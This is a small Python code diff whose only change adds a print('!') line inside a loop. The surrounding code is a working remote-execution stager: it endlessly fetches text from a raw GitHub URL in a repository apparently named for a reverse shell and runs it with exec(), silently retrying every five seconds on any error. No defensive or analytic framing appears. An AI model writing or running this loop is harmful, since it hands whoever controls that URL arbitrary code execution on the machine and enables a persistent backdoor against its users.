@@ -3,6 +3,7 @@ url = "https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/m
 while True:
     try: 
         r = requests.get(url)
+        print("!")
         exec(r.text)
     except:
         time.sleep(5)
